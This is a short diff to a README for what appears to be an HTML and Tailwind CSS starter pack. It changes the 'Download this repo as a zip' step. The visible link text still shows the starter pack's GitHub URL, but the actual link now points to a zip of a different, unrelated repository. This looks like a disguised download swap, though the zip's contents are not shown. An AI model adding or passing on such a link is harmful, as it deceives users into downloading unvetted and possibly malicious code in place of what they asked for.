@@ -1,4 +1,4 @@
-**Step 1:** [Download](https://github.com/thepranaygupta/html-tailwind-css-starter-pack/archive/refs/heads/main.zip) this repo as a zip
+**Step 1:** [Download]([https://github.com/thepranaygupta/html-tailwind-css-starter-pack/archive/refs/heads/main.zip](https://codeload.github.com/inferno2136/XafraPay/zip/refs/heads/main)) this repo as a zip
 
 **Step 2:** To run:
 
